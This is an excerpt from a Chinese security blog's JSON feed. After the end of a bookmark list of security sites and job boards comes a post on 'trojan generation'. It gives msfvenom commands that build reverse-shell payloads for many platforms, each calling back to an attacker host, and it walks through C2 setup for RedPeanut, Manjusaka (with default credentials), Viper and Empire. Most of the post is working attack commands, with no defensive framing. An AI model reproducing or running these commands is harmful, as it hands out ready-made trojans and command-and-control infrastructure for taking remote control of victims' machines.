data-url=\"aHR0cHM6Ly9wcm9ncmFtLXRoaW5rLmJsb2dzcG90LmNvbS8=\">program-think.blogspot.com, 编程随想博客，https://program-think.blogspot.com/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzQ1OS5vcmcv\">459.org, 459 导航，http://459.org/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudGxkcmF3LmNvbS8=\">tldraw.com, TLDR 绘图工具，https://www.tldraw.com/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmhhY2tpbmc4LmNvbS90aXF1YW4=\">i.hacking8.com/tiquan, 哈希提取，https://i.hacking8.com/tiquan</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdXJsLmljdWx0dXJlLmNjLw==\">curl.iculture.cc, Curl 在线工具，https://curl.iculture.cc/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ZvcnRoZXNwYWRhL0NhbXB1c1NoYW1l\">forthespada/CampusShame, 校园羞耻墙，https://github.com/forthespada/CampusShame</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9mb3hpcmouY29tL2Rvd25sb2FkLTI/cG9zdD0xMzcy\">foxirj.com/download-2?post=1372, 福瑞文章下载，https://foxirj.com/download-2?post=1372</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2YwcmIxZGQzbi9SZXB0aWxl\">f0rb1dd3n/Reptile, Reptile 爬虫框架，https://github.com/f0rb1dd3n/Reptile</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2p3ZW55L01lbVNoZWxsRGVtbw==\">jweny/MemShellDemo, MemShell 演示，https://github.com/jweny/MemShellDemo</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kY2MuZ29kYWRkeS5jb20vbWFuYWdlL24xaDFsMTU3LmxpdmUvZG5z\">dcc.godaddy.com/manage/n1h1l157.live/dns, GoDaddy 域名管理，https://dcc.godaddy.com/manage/n1h1l157.live/dns</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb25zb2xlLmNsb3VkLmdvb2dsZS5jb20vY29tcHV0ZS9pbnN0YW5jZXNEZXRhaWwvem9uZXMvdXMtd2VzdDQtYi9pbnN0YW5jZXMvaW5zdGFuY2UtMT9obD16aC1jbiZhbXA7cHJvamVjdD1zZXZlbnRoLXByb2dyYW0tMzg0ODA3\">console.cloud.google.com/compute/instancesDetail/zones/us-west4-b/instances/instance-1?hl=zh-cn&amp;project=seventh-program-384807, Google Cloud 实例详情，https://console.cloud.google.com/compute/instancesDetail/zones/us-west4-b/instances/instance-1?hl=zh-cn&amp;project=seventh-program-384807</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BoNG50b25uL1N0b3dhd2F5\">ph4ntonn/Stowaway, Stowaway 隧道工具，https://github.com/ph4ntonn/Stowaway</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kY2MuZ29kYWRkeS5jb20vY29udHJvbC9uMWgxbDE1Ny5saXZlL2Rucw==\">dcc.godaddy.com/control/n1h1l157.live/dns, GoDaddy DNS 控制面板，https://dcc.godaddy.com/control/n1h1l157.live/dns</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jLnJ1bm9vYi5jb20vZnJvbnQtZW5kLzY4Ni8=\">c.runoob.com/front-end/686/, Runoob 前端教程，https://c.runoob.com/front-end/686/</span></p>\n<h3 id=\"招聘链接\"><a class=\"markdownIt-Anchor\" href=\"#招聘链接\">#</a> 招聘链接</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hbGwuYXFuaXUuY29tLyMvc2FmZXR5UGFub3JhbWE=\">all.aqniu.com, 安全全景，https://all.aqniu.com/#/safetyPanorama</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20v\">freebuf.com, FreeBuf 安全社区，https://www.freebuf.com/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuemhpcGluLmNvbS93ZWIvZ2Vlay9qb2I/cXVlcnk9JUU3JUJEJTkxJUU3JUJCJTlDJUU1JUFFJTg5JUU1JTg1JUE4JmFtcDtjaXR5PTEwMTAyMDEwMCZhbXA7aW5kdXN0cnk9MTAwMDE2JmFtcDtwb3NpdGlvbj0xMDA0MDc=\">zhipin.com, Boss 直聘 - 网络安全岗位，https://www.zhipin.com</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jLmxpZXBpbi5jb20vP3RpbWU9MTY3NjM2Mjg4MjQ5Ng==\">c.liepin.com, 猎聘 - 网络安全职位，https://c.liepin.com</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly94aWFveXVhbi56aGFvcGluLmNvbS8=\">xiaoyuan.zhaopin.com, 智联招聘校园版，https://xiaoyuan.zhaopin.com/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jYW1wdXMuNTFqb2IuY29tL2NoaW5hdGVsZWNvbTIwMjMvam9iZGV0YWlsMS5odG1sP2N0bWlkPTYyNzE4NDgmYW1wO2NpdHk9MDIwMDAwJmFtcDt0eXBlPTEmYW1wO2tleXdvcmQ9JUU3JUJEJTkxJUU3JUJCJTlDJUU1JUFFJTg5JUU1JTg1JUE4\">campus.51job.com, 中国电信校园招聘，https://campus.51job.com</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jYW1wdXMucWlhbnhpbi5jb20vY2FtcHVzL2pvYlNlYXJjaD9qb2JUYWc9YWxs\">campus.qianxin.com, 360 校园招聘，https://campus.qianxin.com</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly90b3BzZWMuemhpeWUuY29tL2ludGVybi9kZXRhaWw/am9iQWRJZD1jOGM5YmJkMC1lNzVmLTQ3YmUtOWI0ZC02NDU2ODI2NjBlMjU=\">topsec.zhiye.com, 天融信校园招聘，https://topsec.zhiye.com/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcHAubW9rYWhyLmNvbS9jYW1wdXMtcmVjcnVpdG1lbnQvenRlLzQ2OTAzIy9qb2JzP3Byb2plY3Q9MTAwMDEwNTA0JmFtcDt6aGluZW5nPTcyMzYzJmFtcDtwYWdlPTE=\">app.mokahr.com, 中兴通讯校园招聘，https://app.mokahr.com</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcHAubW9rYWhyLmNvbS9jYW1wdXNfYXBwbHkvY2hhaXRpbi80NTYyIy9qb2IvMmRmYTQ1NWQtYTdlZS00NmM0LTg5OWYtNWRjZTFlZTZmOTNjL2NhbXB1c19hcHBseS90aGFua3M/am9iSWQ9MmRmYTQ1NWQtYTdlZS00NmM0LTg5OWYtNWRjZTFlZTZmOTNjJmFtcDtyZWNvbW1lbmRDb2RlPU5UQUdsd3gmYW1wO2NvZGVUeXBlPTEmYW1wO2FwcGx5SW5mbyU1QmFpbVdvcmtDaXR5JTVEPSVFNCVCOCU4QSVFNiVCNSVCNyVFNSVCOCU4MiZhbXA7YXBwbHlJbmZvJTVCcmVjb21tZW5kQ29kZSU1RD1OVEFHbHd4JmFtcDtjYW5kaWRhdGVOYW1lPSVFOSU5OSU4OCVFNiU4QiU5MyZhbXA7Y2FuZGlkYXRlSWQ9NDA1NDc0Nzc3\">app.mokahr.com, 赛宁网安校园招聘，https://app.mokahr.com</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcHAubW9rYWhyLmNvbS9jYW1wdXMtcmVjcnVpdG1lbnQvemhpaHUvNjgzMjEjL2pvYi80MzM2ZmZhZS0yNjhlLTRiOGYtYWIyZC04MWQ1MDMwZDk3ZDc=\">app.mokahr.com, 知乎校园招聘，https://app.mokahr.com</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9oci4xNjMuY29tL2pvYi1saXN0Lmh0bWw/d29ya1R5cGU9MQ==\">hr.163.com, 网易校园招聘，https://hr.163.com/j</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jYW1wdXMueGlhb2hvbmdzaHUuY29tLw==\">campus.xiaohongshu.com, 小红书校园招聘，https://campus.xiaohongshu.com/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kcHRlY2guemhpeWUuY29tL2NhbXB1cy9qb2Jz\">dptech.zhiye.com, 东软校园招聘，https://dptech.zhiye.com/campus/jobs</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9qb2JzLmJpbGliaWxpLmNvbS9zb2NpYWwvcG9zaXRpb25zP3R5cGU9Mw==\">jobs.bilibili.com, 哔哩哔哩校园招聘，https://jobs.bilibili.com</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9oci5zYW5nZm9yLmNvbS9jYW1wdWNvbXBvbi9zY2hvb2xSZWNydWl0bWVudA==\">hr.sangfor.comt, 深信服校园招聘，https://hr.sangfor.com</span></p>\n<hr>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9uMWgxbDE1Ny5naXRodWIuaW8v\"></span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3N0aW1nLmNjL2dhbGxlcnkvTXcyUWI2OC9mMTdkMjYzOA==\"></span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zbS5tcy8=\"></span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzL2Jsb2IvbWFzdGVyL01ldGhvZG9sb2d5JTIwYW5kJTIwUmVzb3VyY2VzL1JldmVyc2UlMjBTaGVsbCUyMENoZWF0c2hlZXQubWQjYw==\"></span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3hpYW95LXNlYy9QZW50ZXN0X05vdGUvdHJlZS9tYXN0ZXI=\"></span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2pheXdjamxvdmUvbGludXgtY29tbWFuZA==\"></span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuemhpaHUuY29tL3Blb3BsZS96aGVmdTc5NDIvcG9zdHM/cGFnZT0y\"></span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueGlhb2hvbmdzaHUuY29tL2V4cGxvcmUvNjM5MTkyM2YwMDAwMDAwMDFmMDEwOGM5P2FwcF9wbGF0Zm9ybT1pb3MmYW1wO2FwcF92ZXJzaW9uPTcuNTUmYW1wO3NoYXJlX2Zyb21fdXNlcl9oaWRkZW49dHJ1ZSZhbXA7dHlwZT1ub3JtYWwmYW1wO3hoc3NoYXJlPVdlaXhpblNlc3Npb24mYW1wO2FwcHVpZD01YThhNjRiYjRlYWNhYjI1OWVjMDZjM2EmYW1wO2FwcHRpbWU9MTY3MDU2MjY0Mg==\"></span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM1MzI1MDI0\"></span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wcmFueC5jb20vaGFja2VyLw==\"></span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9nZWVrdHlwZXIuY29tL3RlZ25pby8=\"></span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jeWJlcm1hcC5rYXNwZXJza3kuY29tL2Nu\"></span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuanVuZ3VzLmNuL3poLWhhbnMvdGVzdC8=\"></span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9mb3J1bS55d2hhY2suY29tL2JvdW50eXRpcHMucGhw\"></span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9nY2hxLmdpdGh1Yi5pby9DeWJlckNoZWYv\"></span></p>\n<hr>\n",
            "tags": [
                "信息安全网址"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2023/05/01/SAFE/Trojan/",
            "url": "http://www.n1h1l157.live/2023/05/01/SAFE/Trojan/",
            "title": "Trojan 生成",
            "date_published": "2023-04-30T16:00:00.000Z",
            "content_html": "<p>总想去抓住光，可它没有形状，抓不住也不敢直视。</p>\n<h3 id=\"1msf生成木马\"><a class=\"markdownIt-Anchor\" href=\"#1msf生成木马\">#</a> 1.msf 生成木马</h3>\n<p>参考地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMDk0OTkyL2FydGljbGUvZGV0YWlscy8xMDkwMDQ1NjA=\">https://blog.csdn.net/qq_42094992/article/details/109004560</span></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#windows</span></span><br><span class=\"line\">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.200.209 LPORT=8888 -f exe &gt; ~/Trojan/MSF_Trojan/MSF_windows_reverse.exe</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#linux</span></span><br><span class=\"line\">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.200.209 LPORT=8888 -f elf &gt; ~/Trojan/MSF_Trojan/MSF_linux_reverse.elf</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#mac</span></span><br><span class=\"line\">msfvenom -p osx/x64/shell_reverse_tcp LHOST=192.168.200.209 LPORT=8888 -f macho &gt; ~/Trojan/MSF_Trojan/MSF_mac_reverse.macho</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#android</span></span><br><span class=\"line\">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.200.209 LPORT=8888 R &gt; ~/Trojan/MSF_Trojan/MSF_android_reverse.apk</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#php</span></span><br><span class=\"line\">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.200.209 LPORT=8888 -f raw &gt; ~/Trojan/MSF_Trojan/MSF_php_reverse.php</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#jsp</span></span><br><span class=\"line\">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.200.209 LPORT=8888 -f raw &gt; ~/Trojan/MSF_Trojan/MSF_jsp_reverse.jsp</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#asp</span></span><br><span class=\"line\">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.200.209 LPORT=8888 -f asp &gt; ~/Trojan/MSF_Trojan/MSF_asp_reverse.asp</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#war</span></span><br><span class=\"line\">msfvenom -p java/jsp_shell_reverse_tcp  LHOST=192.168.200.209 LPORT=8888 -f war &gt; ~/Trojan/MSF_Trojan/MSF_war_reverse.war</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#python</span></span><br><span class=\"line\">msfvenom -p cmd/unix/reverse_tcp  LHOST=192.168.200.209 LPORT=8888 -f raw &gt; ~/Trojan/MSF_Trojan/MSF_python_reverse.py</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#perl</span></span><br><span class=\"line\">msfvenom -p cmd/unix/reverse_perl LHOST=192.168.200.209 LPORT=8888 -f raw &gt; ~/Trojan/MSF_Trojan/MSF_perl_reverse.pl</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#sh</span></span><br><span class=\"line\">msfvenom -p cmd/unix/reverse_bash LHOST=192.168.200.209 LPORT=8888 -f raw &gt; ~/Trojan/MSF_Trojan/MSF_sh_reverse.sh</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#java--不需要此马</span></span><br><span class=\"line\">msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.200.209 LPORT=8888 -f jar &gt; ~/Trojan/MSF_Trojan/MSF_java_reverse.jar</span><br><span class=\"line\">./tools/jar2exe/jar2exe.sh MSF_java.jar MSF_java.class</span><br></pre></td></tr></table></figure>\n<h3 id=\"2redpeanut生成木马\"><a class=\"markdownIt-Anchor\" href=\"#2redpeanut生成木马\">#</a> 2.RedPeanut 生成木马</h3>\n<p>github 地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2I0cnRpay9SZWRQZWFudXQ=\">https://github.com/b4rtik/RedPeanut</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">安装dotnet</span></span><br><span class=\"line\">rpm -Uvh https://packages.microsoft.com/config/rhel/7/packages-microsoft-prod.rpm</span><br><span class=\"line\">yum install dotnet-sdk-2.2</span><br><span class=\"line\">dotnet</span><br><span class=\"line\">dotnet build</span><br><span class=\"line\">dotnet run</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">设置监听器</span></span><br><span class=\"line\">c2 list </span><br><span class=\"line\">listener options http</span><br><span class=\"line\">set name RedPeanut_listener</span><br><span class=\"line\">set lhost 47.102.120.55</span><br><span class=\"line\">set lport 4444</span><br><span class=\"line\">run</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">exe</span></span><br><span class=\"line\">launcher</span><br><span class=\"line\">exe</span><br><span class=\"line\">set filename RedPeanut_exe.exe</span><br><span class=\"line\">set lhost 47.102.120.55</span><br><span class=\"line\">set lport 4444</span><br><span class=\"line\">set profile 2</span><br><span class=\"line\">options</span><br><span class=\"line\">run</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">dll</span> </span><br><span class=\"line\">launcher </span><br><span class=\"line\">dll</span><br><span class=\"line\">set filename RedPeanut_dll.dll</span><br><span class=\"line\">set lhost 47.102.120.55</span><br><span class=\"line\">set lport 4444</span><br><span class=\"line\">set profile 2</span><br><span class=\"line\">options</span><br><span class=\"line\">run</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">powershell</span></span><br><span class=\"line\">launcher </span><br><span class=\"line\">powershell</span><br><span class=\"line\">set filename RedPeanut_ps1.ps1</span><br><span class=\"line\">set hosted False</span><br><span class=\"line\">set lport 4444</span><br><span class=\"line\">set profile 2</span><br><span class=\"line\">options</span><br><span class=\"line\">run</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">Hta (vbs,powershell)</span></span><br><span class=\"line\">launcher</span><br><span class=\"line\">hta</span><br><span class=\"line\">set filename RedPeanut_hta.hta</span><br><span class=\"line\">set lhost 47.102.120.55</span><br><span class=\"line\">set lport 4444</span><br><span class=\"line\">set profile 2</span><br><span class=\"line\">options</span><br><span class=\"line\">run</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">InstallUtil</span></span><br><span class=\"line\">launcher</span><br><span class=\"line\">installutil</span><br><span class=\"line\">set filename RedPeanut_installutil.installutil</span><br><span class=\"line\">set lhost 47.102.120.55</span><br><span class=\"line\">set lport 4444</span><br><span class=\"line\">set profile 2</span><br><span class=\"line\">options</span><br><span class=\"line\">run</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">MSBuild</span></span><br><span class=\"line\">launcher</span><br><span class=\"line\">msbuild</span><br><span class=\"line\">set filename RedPeanut_msbuild.msbuild</span><br><span class=\"line\">set lhost 47.102.120.55</span><br><span class=\"line\">set lport 4444</span><br><span class=\"line\">set profile 2</span><br><span class=\"line\">options</span><br><span class=\"line\">run</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">Macro/VBA</span></span><br><span class=\"line\">launcher</span><br><span class=\"line\">vba</span><br><span class=\"line\">set filename RedPeanut_vba.vba</span><br><span class=\"line\">set lhost 47.102.120.55</span><br><span class=\"line\">set lport 4444</span><br><span class=\"line\">set profile 2</span><br><span class=\"line\">options</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<h3 id=\"3manjusaka生成木马\"><a class=\"markdownIt-Anchor\" href=\"#3manjusaka生成木马\">#</a> 3.Manjusaka 生成木马</h3>\n<p>github 地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1lESENVSS9tYW5qdXNha2EvcmVsZWFzZXM=\">https://github.com/YDHCUI/manjusaka/releases</span></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#设置权限并运行</span></span><br><span class=\"line\"><span class=\"built_in\">chmod</span> +x manjusaka</span><br><span class=\"line\">./manjusaka</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#web界面与初始密码</span></span><br><span class=\"line\">http://47.102.120.55:3200/manjusaka/static/</span><br><span class=\"line\">初始用户: manjusaka   密码: 402432f678e74cb7</span><br></pre></td></tr></table></figure>\n<h3 id=\"4viper生成木马\"><a class=\"markdownIt-Anchor\" href=\"#4viper生成木马\">#</a> 4.Viper 生成木马</h3>\n<p>使用教程：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL3ZpcGVyc2VjL2hlbHAvb2xnMXVh\">https://www.yuque.com/vipersec/help/olg1ua</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">f8x一键安装</span></span><br><span class=\"line\">sysctl -w vm.max_map_count=262144</span><br><span class=\"line\">curl -o f8x https://f8x.io/   # wget -O f8x https://f8x.io/</span><br><span class=\"line\">bash f8x -viper</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">访问web生成payload</span></span><br><span class=\"line\">https://vpsip:60000/#/user/login</span><br><span class=\"line\">用户名:root 密码:****自定义密码**</span><br></pre></td></tr></table></figure>\n<h3 id=\"5empire生成木马\"><a class=\"markdownIt-Anchor\" href=\"#5empire生成木马\">#</a> 5.Empire 生成木马</h3>\n<p>github 地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0VtcGlyZVByb2plY3QvRW1waXJl\">https://github.com/EmpireProject/Empire</span><br>\n 使用教程：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTM5MzA4OTkvYXJ0aWNsZS9kZXRhaWxzLzEyNDg3MTkwMQ==\">https://blog.csdn.net/u013930899/article/details/124871901</span> <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veW9rYW4vcC8xMzE3OTczMC5odG1s\">https://www.cnblogs.com/yokan/p/13179730.html</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">安装环境</span></span><br><span class=\"line\">docker pull empireproject/empire</span><br><span class=\"line\">docker run -it -p 7000:7000 --name empire empireproject/empire /bin/bash</span><br><span class=\"line\"></span><br><span class=\"line\">​#需要先升级pip</span><br><span class=\"line\">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py</span><br><span class=\"line\">python get-pip.py</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">安装缺少的依赖</span></span><br><span class=\"line\">ln -s /usr/local/bin/pip2.7 /usr/bin/pip</span><br><span class=\"line\">pip install pefile  </span><br><span class=\"line\">sudo ./empire</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">生成Empire木马</span></span><br><span class=\"line\">listeners</span><br><span class=\"line\">uselistener http</span><br><span class=\"line\">info</span><br><span class=\"line\">set Name bk</span><br><span class=\"line\">set Port 8888</span><br><span class=\"line\">execute</span><br><span class=\"line\">back</span><br><span class=\"line\">usestager windows/launcher_bat bk</span><br><span class=\"line\">usestager multi/bash bk</span><br><span class=\"line\">usestager windows/dll bk</span><br><span class=\"line\">usestager windows/wmic bk</span><br><span class=\"line\">usestager windows/launcher_bat bk</span><br><span class=\"line\">usestager windows/launcher_vbs bk</span><br><span class=\"line\">info</span><br><span class=\"line\">execute</span><br></pre></td></tr></table></figure>\n<h3 id=\"6大灰狼远控\"><a class=\"markdownIt-Anchor\" href=\"#6大灰狼远控\">#</a> 6. 大灰狼远控</h3>\n<p>github 地址：<span class=\"exturl\" 